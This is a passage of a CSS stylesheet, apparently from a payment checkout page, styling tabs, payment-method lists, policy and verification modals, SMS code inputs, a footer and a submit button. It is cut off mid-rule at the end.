        .Tabs.is-desktop.is-icontabs .Tabs-TabList > .Tabs-TabListItemContainer {
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 0%;
            -ms-flex: 1 1 0%;
            flex: 1 1 0%;
            min-width: 0;
            max-width: 100%;
        }

        .Tabs.is-desktop.is-icontabs .Tabs-TabList--wrap > .Tabs-TabListItemContainer {
            margin: 0 8px 8px 0;
        }

        .Tabs.is-desktop.is-contenttabs .Tabs-TabList > .Tabs-TabListItemContainer {
            -webkit-box-flex: 0;
            -webkit-flex: 0;
            -ms-flex: 0;
            flex: 0;
        }

        .Tabs.is-desktop .Tabs-TabList > .Tabs-TabListItemContainer.Tabs-TabListItemContainer--overflow-button {
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItemContainer {
            margin: 0;
            padding: 0;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItem:after {
            display: none;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItem:not(:focus) {
            box-shadow: none;
            position: static;
        }

        .Tabs.is-desktop .Tabs-TabListItem:hover .Tabs-TabListItemContent {
            opacity: 1;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItem:hover {
            background-color: rgba(26, 26, 26, 0.1);
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItem:hover .Tabs-TabListItemContent {
            opacity: 1;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListPaymentMethod {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListPaymentIcon {
            min-width: 28px;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListPaymentIcon img {
            margin: 0 auto;
            display: block;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListItem {
            padding: 8px 12px;
            border-radius: 0;
            border: 0;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListPaymentMethod {
            -webkit-box-orient: horizontal;
            -webkit-box-direction: normal;
            -webkit-flex-direction: row;
            -ms-flex-direction: row;
            flex-direction: row;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer .Tabs-TabListPaymentLabel {
            margin-left: 12px;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer {
            opacity: 0;
            pointer-events: none;
            position: absolute;
            -webkit-transform: translateY(4px);
            -ms-transform: translateY(4px);
            transform: translateY(4px);
            top: -6px;
            right: -6px;
            z-index: 9999;
            display: block;
            transition: opacity 0.2s ease, -webkit-transform 0.2s ease;
            transition: opacity 0.2s ease, transform 0.2s ease;
            transition: opacity 0.2s ease, transform 0.2s ease, -webkit-transform 0.2s ease;
        }

        .Tabs.is-desktop .Tabs-TabListOverflowContainer--is-visible {
            opacity: 1;
            pointer-events: auto;
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: opacity 0.25s cubic-bezier(0, 1, 0.4, 1), transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .Tabs.is-desktop .Tabs-TabListItemContainer--overflow-button .Tabs-TabListItem:focus {
            box-shadow: 0 0 0 1px #e0e0e0;
        }

        .Tabs.is-desktop .Tabs-TabList--wrap {
            -webkit-box-pack: start;
            -webkit-justify-content: start;
            -ms-flex-pack: start;
            justify-content: start;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
        }

        .Tabs.is-desktop .Tabs-TabList--wrap .Tabs-TabListItemContainer {
            margin-left: 0;
        }

        .Tabs.is-desktop .Tabs-TabList.Tabs-TabList--wrap > .Tabs-TabListItemContainer {
            min-width: -webkit-min-content;
            min-width: -moz-min-content;
            min-width: min-content;
            max-width: -webkit-max-content;
            max-width: -moz-max-content;
            max-width: max-content;
        }

        .Tabs.is-mobile .Tabs-TabList {
            overflow-x: scroll;
            overflow-x: -moz-scrollbars-none;
            scrollbar-width: none;
            width: 100vw;
            position: relative;
            left: 50%;
            right: 50%;
            margin: -16px -50vw;
            padding-top: 16px;
            padding-bottom: 16px;
        }

        .Tabs.is-mobile.is-overflowing .Tabs-TabListItemContainer {
            -webkit-flex-basis: 27vw;
            -ms-flex-preferred-size: 27vw;
            flex-basis: 27vw;
            -webkit-box-flex: 0;
            -webkit-flex-grow: 0;
            -ms-flex-positive: 0;
            flex-grow: 0;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
        }

        @media only screen and (max-width: 320px) {
            .Tabs.is-mobile.is-overflowing .Tabs-TabListItemContainer {
                -webkit-flex-basis: 26vw;
                -ms-flex-preferred-size: 26vw;
                flex-basis: 26vw;
            }
        }

        .Tabs.is-mobile .Tabs-TabList > .Tabs-TabListItemContainer:first-of-type {
            margin-left: 16px;
        }

        .Tabs.is-mobile .Tabs-TabList > .Tabs-TabListItemContainer:last-of-type {
            padding-right: 16px;
        }

        .Tabs.is-mobile .Tabs-TabListItemContainer--overflow-button {
            display: none;
        }

        @media only screen and (min-width: 412px) {
            .Tabs.is-mobile .Tabs-TabList > .Tabs-TabListItemContainer:first-of-type {
                margin-left: calc((100vw - 380px) / 2);
            }

            .Tabs.is-mobile .Tabs-TabList > .Tabs-TabListItemContainer:last-of-type {
                padding-right: calc((100vw - 380px) / 2);
            }
        }

        .Tabs.is-mobile .Tabs-TabList::-webkit-scrollbar {
            display: none;
        }

        .Tabs.is-icontabs .Tabs-TabListItemContainer,
        .Tabs.is-icontabs .Tabs-TabListOverflowContainer {
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto;
            -ms-flex: 1 1 auto;
            flex: 1 1 auto;
            margin-left: 8px;
        }

        .Tabs.is-contenttabs .Tabs-TabListItemContainer,
        .Tabs.is-contenttabs .Tabs-TabListOverflowContainer {
            margin-left: 8px;
        }

        .Tabs .Tabs-TabListItemContainer:first-of-type {
            margin-left: 0;
        }

        .Tabs-TabListItem {
            width: 100%;
            height: 100%;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            cursor: pointer;
            font-weight: 500;
            border: 0;
            text-align: left;
            /* !important to override normalize.css */
            -webkit-appearance: none !important;
            -moz-appearance: none !important;
            appearance: none !important;
            transition: box-shadow 0.08s ease-in, border 0.08s ease-in;
            position: relative;
        }

        .Tabs.is-icontabs .Tabs-TabListItem {
            border-radius: 6px;
            padding: 10px 12px 8px;
            color: rgba(26, 26, 26, 0.9);
            box-shadow: 0 0 0 1px #e0e0e0;
            background-color: #fff;
            font-size: 12px;
        }

        .App-Container.is-squareBordered .Tabs.is-icontabs .Tabs-TabListItem {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Tabs.is-icontabs .Tabs-TabListItem {
            border-radius: 18px;
        }

        .Tabs.is-icontabs .Tabs-TabListItem:focus-visible {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .Tabs.is-contenttabs .Tabs-TabListItem {
            padding: 4px 0;
            background-color: transparent;
            font-size: 14px;
            line-height: 20px;
            height: auto;
        }

        .Tabs-TabListItem::-moz-focus-inner {
            outline: 0 !important;
        }

        .Tabs-TabListItem:focus {
            outline: 0 !important;
        }

        .Tabs-TabListItem:focus-visible {
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .Tabs-TabListItem:after {
            content: "";
            will-change: transform;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            transition: opacity 0.2s ease;
            opacity: 0;
        }

        .Tabs.is-icontabs .Tabs-TabListItem:after {
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            border-radius: 6px;
        }

        .Tabs.is-contenttabs .Tabs-TabListItem:after {
            position: absolute;
            height: 2px;
            top: calc(100% - 2px);
            left: -1px;
            background: #5469d4;
        }

        .Tabs.is-icontabs .Tabs-TabListItem--is-selected:after {
            box-shadow: 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .Tabs.is-icontabs .Tabs-TabListItem--is-selected:after,
        .Tabs.is-icontabs .Tabs-TabListItem:hover:after {
            opacity: 1;
        }

        .Tabs.is-icontabs .Tabs-TabListItem--is-selected {
            box-shadow: 0 0 0 1px rgba(26, 26, 26, 0.9), 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
        }

        .Tabs.is-icontabs .Tabs-TabListItem--is-selected:focus {
            box-shadow: 0 0 0 1px rgba(26, 26, 26, 0.9), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .Tabs.is-contenttabs .Tabs-TabListItem {
            opacity: 0.8;
        }

        .Tabs.is-contenttabs .Tabs-TabListItem--is-selected:after {
            opacity: 1;
        }

        .Tabs.is-contenttabs .Tabs-TabListItem--is-selected {
            color: #5469d4;
            opacity: 1;
        }

        .Tabs.is-disabled .Tabs-TabListItem {
            cursor: auto;
        }

        .Tabs-TabListItem .Tabs-TabListItemContent {
            opacity: 0.7;
            transition: opacity 0.2s ease;
            will-change: opacity;
            min-width: 0;
            overflow: hidden;
        }

        .Tabs-TabListItem--is-selected .Tabs-TabListItemContent {
            opacity: 1;
        }

        .Tabs-TabListItem .Tabs-TabListItemContent svg {
            -webkit-filter: grayscale(100%);
            filter: grayscale(100%);
        }

        .Tabs-TabListPaymentMethod {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
        }

        .Tabs-TabListPaymentIcon,
        .Tabs-TabListPaymentLabel {
            -webkit-box-flex: 1;
            -webkit-flex: 1 1 auto;
            -ms-flex: 1 1 auto;
            flex: 1 1 auto;
        }

        .Tabs-TabListPaymentLabel {
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
        }

        .Tabs-TabListDropdown {
            position: absolute;
            right: 0;
            top: 100%;
            z-index: 1;
        }

        .Tabs-TabListDropdown.Tabs-TabListDropdown--is-closed {
            position: fixed;
            height: 1px;
            width: 1px;
            overflow: hidden;
            visibility: hidden;
            margin: 0;
            padding: 0;
            pointer-events: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .Tabs-TabPanelContainer {
            position: relative;
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            margin-top: 24px;
        }

        .Tabs-TabPanelContent {
            width: 100%;
        }

        .App-Container.is-squareBordered .Tabs-TabListItem {
            border-radius: 0;
        }

        .App-Container.is-veryRoundBordered .Tabs-TabListItem {
            border-radius: 18px;
        }

        .PoliciesModal-modal {
            max-width: 500px;
            min-width: 316px;
            overflow-x: hidden;
        }

        .PoliciesModal-list {
            padding-left: 18px;
            margin-top: 4px;
            line-height: 24px;
            margin-bottom: 0;
        }

        .PoliciesModal-listItem {
            color: rgba(26, 26, 26, 0.5);
        }

        .PoliciesModal-listItem::marker {
            font-size: 12px;
        }

        .PoliciesModal-header {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
        }

        .PoliciesModal-content,
        .PoliciesModal-header {
            padding: 24px;
        }

        .PoliciesModal-content {
            height: 300px;
            overflow: auto;
            overflow-x: hidden;
        }

        .PoliciesModal-supportInfo {
            white-space: nowrap;
        }

        .PoliciesModal-header .Button-Icon {
            margin: 0;
        }

        .PoliciesModal-paymentTerms {
            margin-top: 16px;
        }

        .PoliciesModal-footer {
            border-top: 1px solid rgba(26, 26, 26, 0.1);
            padding: 24px;
            text-align: center;
        }

        .PoliciesModal-customPolicyMessage {
            padding-bottom: 16px;
        }

        @media only screen and (max-width: 767.98px) {
            .PoliciesModal-modal {
                max-width: 100vw;
                border-radius: 8px 8px 0 0;
                overflow: hidden;
            }

            .PoliciesModal-content {
                max-height: 40vh;
                overflow-y: scroll;
            }

            .PoliciesModal-modalOverlay {
                -webkit-box-align: end;
                -webkit-align-items: flex-end;
                -ms-flex-align: end;
                align-items: flex-end;
            }
        }

        @media only screen and (max-width: 320px) {
            .PoliciesModal-content {
                max-height: 30vh;
            }
        }

        .PoliciesModal-modal .Tabs-TabList {
            padding-left: 24px;
        }

        .PoliciesModal-modal .Tabs-TabListItemContainer {
            padding: 16px 0;
        }

        .PoliciesModal-modal .Tabs.is-contenttabs .Tabs-TabListItemContainer:not(:first-of-type) {
            margin-left: 16px;
        }

        .PoliciesModal-modal .Tabs.is-contenttabs .Tabs-TabListItem--is-selected {
            color: #0074d4;
        }

        .PoliciesModal-modal .Tabs.is-contenttabs .Tabs-TabListItem--is-selected:after {
            opacity: 0;
        }

        .PoliciesModal-modal .Tabs.is-mobile .Tabs-TabList {
            margin: auto;
            padding: 0;
            left: auto;
            right: auto;
        }

        .PoliciesModal-modal .Tabs.is-mobile .Tabs-TabList > .Tabs-TabListItemContainer:first-of-type {
            margin-left: 24px;
        }

        .PoliciesModal-modal .Tabs-TabPanelContainer {
            margin-top: 0;
        }

        .Footer {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -webkit-flex-direction: column;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
        }

        .Footer-PoweredBy-Icon {
            vertical-align: text-bottom;
            -webkit-transform: translateY(1.5px);
            -ms-transform: translateY(1.5px);
            transform: translateY(1.5px);
            fill: rgba(26, 26, 26, 0.4);
        }

        .Footer-PoweredBy {
            width: 100%;
            text-align: center;
        }

        .Footer-Links,
        .Footer-PoweredBy {
            padding: 4px;
        }

        .Footer-Links .Link {
            margin-right: 12px;
        }

        .Footer-Links .Link:last-of-type {
            margin-right: 0;
        }

        .is-darkMode .Footer .Text-color--gray400 {
            color: hsla(0, 0%, 100%, 0.5);
        }

        .Footer.is-darkBackground.is-mobilePaymentMenu .Footer-PoweredBy-Icon,
        .is-darkMode .Footer .Footer-PoweredBy-Icon {
            fill: hsla(0, 0%, 100%, 0.4);
        }

        @media only screen and (min-width: 992px) {
            .Footer {
                height: 16px;
                line-height: 16px;
                -webkit-box-orient: horizontal;
                -webkit-box-direction: normal;
                -webkit-flex-direction: row;
                -ms-flex-direction: row;
                flex-direction: row;
            }

            .Footer-Links {
                padding: 0 0 0 16px;
            }

            .Footer-PoweredBy {
                padding: 0 16px 0 0;
                border-right: 1px solid rgba(26, 26, 26, 0.1);
                width: auto;
                text-align: left;
            }

            .Footer.is-darkBackground .Footer-PoweredBy {
                border-right: 1px solid hsla(0, 0%, 100%, 0.1);
            }

            .Footer.is-darkBackground .Text-color--gray400 {
                color: hsla(0, 0%, 100%, 0.5);
            }

            .Footer.is-darkBackground .Footer-PoweredBy-Icon {
                fill: hsla(0, 0%, 100%, 0.4);
            }

            .App-Container--setupMode .Footer {
                width: 100%;
                -webkit-box-pack: center;
                -webkit-justify-content: center;
                -ms-flex-pack: center;
                justify-content: center;
                text-align: center;
            }
        }

        .CheckoutFooter-link {
            display: inline;
            padding: 4px;
            margin-right: 4px;
        }

        .CheckoutFooter-links {
            margin-left: 12px;
        }

        .CheckoutFooter-links.Button--link:focus {
            outline: 1px dotted rgba(26, 26, 26, 0.5);
            box-shadow: none;
        }

        @media only screen and (max-width: 991.98px) {
            .CheckoutFooter-links {
                margin-left: 0;
            }
        }

        .PolicyHighlight-container {
            width: 100%;
        }

        .PolicyHighlight-highlight {
            width: -webkit-fit-content;
            width: -moz-fit-content;
            width: fit-content;
            cursor: pointer;
            padding: 0 8px;
            margin: auto auto 8px;
            color: rgba(26, 26, 26, 0.6);
        }

        .PolicyHighlight-highlight.Button--link:focus {
            outline: 1px dotted rgba(26, 26, 26, 0.5);
            box-shadow: none;
        }

        .PolicyHighlight-icon {
            color: rgba(26, 26, 26, 0.6);
            margin-right: 8px;
            margin-bottom: 1px;
        }

        .PolicyHighlight-highlight,
        .PolicyHighlight-icon {
            transition: color 0.2s ease;
        }

        .PolicyHighlight-highlight:hover,
        .PolicyHighlight-highlight:hover .PolicyHighlight-icon {
            color: rgba(26, 26, 26, 0.8);
        }

        @-webkit-keyframes inputShake {
            0% {
                -webkit-transform: translateX(0) rotateY(0);
                transform: translateX(0) rotateY(0);
            }
            12.5% {
                -webkit-transform: translateX(-6px) rotateY(-5deg);
                transform: translateX(-6px) rotateY(-5deg);
            }
            37.5% {
                -webkit-transform: translateX(5px) rotateY(4deg);
                transform: translateX(5px) rotateY(4deg);
            }
            62.5% {
                -webkit-transform: translateX(-3px) rotateY(-2deg);
                transform: translateX(-3px) rotateY(-2deg);
            }
            87.5% {
                -webkit-transform: translateX(2px) rotateY(1deg);
                transform: translateX(2px) rotateY(1deg);
            }
            to {
                -webkit-transform: translateX(0) rotateY(0);
                transform: translateX(0) rotateY(0);
            }
        }

        @keyframes inputShake {
            0% {
                -webkit-transform: translateX(0) rotateY(0);
                transform: translateX(0) rotateY(0);
            }
            12.5% {
                -webkit-transform: translateX(-6px) rotateY(-5deg);
                transform: translateX(-6px) rotateY(-5deg);
            }
            37.5% {
                -webkit-transform: translateX(5px) rotateY(4deg);
                transform: translateX(5px) rotateY(4deg);
            }
            62.5% {
                -webkit-transform: translateX(-3px) rotateY(-2deg);
                transform: translateX(-3px) rotateY(-2deg);
            }
            87.5% {
                -webkit-transform: translateX(2px) rotateY(1deg);
                transform: translateX(2px) rotateY(1deg);
            }
            to {
                -webkit-transform: translateX(0) rotateY(0);
                transform: translateX(0) rotateY(0);
            }
        }

        .SmsCodeInput {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            max-width: 230px;
        }

        .SmsCodeInput.is-invalid {
            -webkit-animation-duration: 0.3s;
            animation-duration: 0.3s;
            -webkit-animation-timing-function: ease-in-out;
            animation-timing-function: ease-in-out;
            -webkit-animation-name: inputShake;
            animation-name: inputShake;
        }

        .SmsCodeInput-inputGroup {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
        }

        .SmsCodeInput-separator {
            background: rgba(26, 26, 26, 0.3);
            height: 1px;
            width: 8px;
            padding: 0;
            -webkit-flex-shrink: 0;
            -ms-flex-negative: 0;
            flex-shrink: 0;
            margin: 0 8px;
            -webkit-align-self: center;
            -ms-flex-item-align: center;
            -ms-grid-row-align: center;
            align-self: center;
        }

        .SmsCodeInput-inputGroup input {
            width: 100%;
            -webkit-box-flex: 0;
            -webkit-flex: 0 1 auto;
            -ms-flex: 0 1 auto;
            flex: 0 1 auto;
            min-width: 0;
            max-width: 100%;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            text-align: center;
            color: rgba(26, 26, 26, 0.9);
            font-size: 20px;
            line-height: 1.5;
            border: 0;
            border-radius: 0;
            box-shadow: 0 0 0 1px #e0e0e0, 0 2px 4px 0 rgba(0, 0, 0, 0.07), 0 1px 1.5px 0 rgba(0, 0, 0, 0.05);
            transition: box-shadow 0.08s ease-in, color 0.08s ease-in, filter 50000s;
        }

        .SmsCodeInput-inputGroup input:focus {
            outline: none;
            z-index: 2;
            box-shadow: 0 0 0 1px rgba(50, 151, 211, 0.3), 0 1px 1px 0 rgba(0, 0, 0, 0.07), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .SmsCodeInput-inputGroup input::-ms-clear {
            display: none;
        }

        .SmsCodeInput-inputGroup input:disabled {
            color: rgba(26, 26, 26, 0.4);
        }

        .SmsCodeInput-inputGroup input:first-child {
            border-top-left-radius: 6px;
            border-bottom-left-radius: 6px;
        }

        .SmsCodeInput-inputGroup input:last-child {
            border-top-right-radius: 6px;
            border-bottom-right-radius: 6px;
        }

        .VerificationStatus {
            background-color: rgba(26, 26, 26, 0.05);
            padding: 8px;
            border-radius: 6px;
        }

        .VerificationStatus.is-invalid {
            background-color: rgba(220, 39, 39, 0.04);
            color: #dc2727;
        }

        .VerificationStatus.is-succeeded {
            background-color: rgba(36, 180, 126, 0.05);
            color: #24b47e;
        }

        .VerificationStatus svg {
            fill: rgba(26, 26, 26, 0.5);
            margin-right: 8px;
        }

        .VerificationStatus.is-invalid svg {
            fill: #dc2727;
        }

        .VerificationStatus.is-succeeded path,
        .VerificationStatus.is-succeeded svg {
            fill: #24b47e;
        }

        .VerificationStatus-messageLine,
        .VerificationStatus-phoneNumberLine {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
        }

        .VerificationStatus-phoneNumberLine {
            margin-top: 4px;
        }

        .VerificationStatus-phoneNumberLine svg {
            margin-right: 4px;
        }

        .VerificationModal-modalOverlay {
            opacity: 0;
            background-color: rgba(0, 0, 0, 0.2);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            transition: opacity 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .VerificationModal-modalOverlay.ModalOverlay--afterOpen {
            opacity: 1;
        }

        .VerificationModal-modalOverlay.ModalOverlay--beforeClose {
            opacity: 0;
            transition: opacity 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .VerificationModal-modal {
            background-color: #fff;
            -webkit-backdrop-filter: blur(40px);
            backdrop-filter: blur(40px);
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            max-width: 360px;
            min-width: 316px;
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .ModalContent--is-squareBordered.VerificationModal-modal {
            border-radius: 0;
        }

        .ModalContent--is-veryRoundBordered.VerificationModal-modal {
            border-radius: 18px;
        }

        .VerificationModal-modal.ModalContent--afterOpen {
            -webkit-transform: none;
            -ms-transform: none;
            transform: none;
        }

        .VerificationModal-modal.ModalContent--beforeClose {
            -webkit-transform: scale(0.95);
            -ms-transform: scale(0.95);
            transform: scale(0.95);
            transition: -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
            transition: transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1), -webkit-transform 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .VerificationModal-modalHeader {
            border-bottom: 1px solid rgba(26, 26, 26, 0.1);
            padding: 16px;
        }

        .VerificationModal-modalHeader .InlineSVG {
            fill: #24b47e;
        }

        .VerificationModal-modalContent {
            padding: 24px 32px;
            text-align: center;
        }

        .ClimateContributionSelectorInfoModal-modal {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.2), 0 6px 12px rgba(0, 0, 0, 0.03);
            color: rgba(26, 26, 26, 0.7);
            max-width: 348px;
            padding: 32px;
            width: 100%;
        }

        .ClimateContributionSelectorInfoModal-modalOverlay {
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            background-color: rgba(0, 0, 0, 0.2);
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            -webkit-box-pack: center;
            -webkit-justify-content: center;
            -ms-flex-pack: center;
            justify-content: center;
            opacity: 0;
            transition: opacity 0.25s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .ClimateContributionSelectorInfoModal-modalOverlay.ModalOverlay--afterOpen {
            opacity: 1;
        }

        .ClimateContributionSelectorInfoModal-modalOverlay.ModalOverlay--beforeClose {
            opacity: 0;
            transition: opacity 0.2s cubic-bezier(0.18, 1.25, 0.4, 1);
        }

        .ClimateContributionSelectorInfoModal-learnMoreLink {
            text-align: center;
        }

        .ClimateContributionSelectorInfoModal-icon path,
        .ClimateContributionSelectorInfoModal-icon svg {
            fill: rgba(26, 26, 26, 0.7);
        }

        .SubmitButton {
            position: relative;
            overflow: hidden;
            height: 44px;
            width: 100%;
            margin-top: 12px;
            padding: 0;
            color: #fff;
            box-shadow: inset 0 0 0 1px rgba(50, 50, 93, 0.1), 0 2px 5px 0 rgba(50, 50, 93, 0.1), 0 1px 1px 0 rgba(0, 0, 0, 0.07);
            border: 0;
            outline: none;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s ease, box-shadow 0.08s ease-in;
            -webkit-backface-visibility: hidden;
            backface-visibility: hidden;
            -webkit-transform: translateZ(0);
            transform: translateZ(0);
        }

        .SubmitButton:disabled {
            cursor: default;
        }

        .SubmitButton-Shimmer {
            content: "";
            position: absolute;
            top: 0;
            bottom: 0;
            left: 0;
            height: 100%;
            width: 150%;
            opacity: 0;
            -webkit-transform: translateX(-150%);
            -ms-transform: translateX(-150%);
            transform: translateX(-150%);
            transition: opacity 0.2s ease;
        }

        .SubmitButton-Text {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            text-align: center;
            line-height: 44px;
            transition: all 0.2s ease;
        }

        .SubmitButton-IconContainer {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            -webkit-transform: translateX(-16px);
            -ms-transform: translateX(-16px);
            transform: translateX(-16px);
            transition: -webkit-transform 0.3s ease;
            transition: transform 0.3s ease;
            transition: transform 0.3s ease, -webkit-transform 0.3s ease;
        }

        .SubmitButton-Icon {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            position: absolute;
            top: 50%;
            right: 0;
            -webkit-transform: translateY(-50%);
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
            opacity: 0;
            transition: all 0.2s ease;
        }

        .SubmitButton-SpinnerIcon .Icon,
        .SubmitButton-SpinnerIcon svg {
            height: 20px;
            width: 20px;
        }

        .SubmitButton-SpinnerIcon ellipse {
            stroke-width: 1;
            stroke-linecap: round;
            stroke-dasharray: 70;
            stroke-dashoffset: 30;
            fill: transparent;
            -webkit-transform-origin: center;
            -ms-transform-origin: center;
            transform-origin: center;
            -webkit-animation: spinner-spin 0.6s linear infinite;
            animation: spinner-spin 0.6s linear infinite;
        }

        .SubmitButton-CheckmarkIcon {
            position: absolute;
            top: 50%;
            left: 50%;
            -webkit-transform: translateY(calc(-50% + 2px)) translateX(-50%) scale(0.6);
            -ms-transform: translateY(calc(-50% + 2px)) translateX(-50%) scale(0.6);
            transform: translateY(calc(-50% + 2px)) translateX(-50%) scale(0.6);
        }

        .SubmitButton-CheckmarkIcon path {
            stroke-linecap: round;
            stroke-dasharray: 30;
            stroke-dashoffset: 30;
            opacity: 0;
        }

        .SubmitButton--clickable:hover,
        .SubmitButton--complete:hover {
            background-color: #005ebb;
            box-shadow: inset 0 0 0 1px rgba(50, 50, 93, 0.1), 0 6px 15px 0 rgba(50, 50, 93, 0.2), 0 2px 2px 0 rgba(0, 0, 0, 0.1);
        }

        .SubmitButton--clickable:active,
        .SubmitButton--complete:active {
            -webkit-transform: scale(0.99);
            -ms-transform: scale(0.99);
            transform: scale(0.99);
        }

        .SubmitButton--clickable:focus,
        .SubmitButton--complete:focus,
        .SubmitButton--incomplete:focus {
            box-shadow: inset 0 0 0 1px rgba(50, 50, 93, 0.1), 0 6px 15px 0 rgba(50, 50, 93, 0.2), 0 2px 2px 0 rgba(0, 0, 0, 0.1), 0 0 0 4px rgba(50, 151, 211, 0.3);
        }

        .SubmitButton--incomplete .SubmitButton-Text--current {
            opacity: 0.6;
        }

        .SubmitButton--complete-Shimmer {
            opacity: 1;
            -webkit-animation: shimmer-move 3s ease infinite;
            animation: shimmer-move 3s ease infinite;
        }

        .SubmitButton--complete:hover.SubmitButton--complete-Shimmer {
            opacity: 0.6;
        }

        .SubmitButton--success {
            background-color: #24b47e;
        }

        .SubmitButton--success .SubmitButton-IconContainer {
            -webkit-transform: translateX(calc(-50% + 10px));
            -ms-transform: translateX(calc(-50% + 10px));
            transform: translateX(calc(-50% + 10px));
        }

        .SubmitButton--disabled {
            box-shadow: none;
        }

        .SubmitButton-Text--pre {
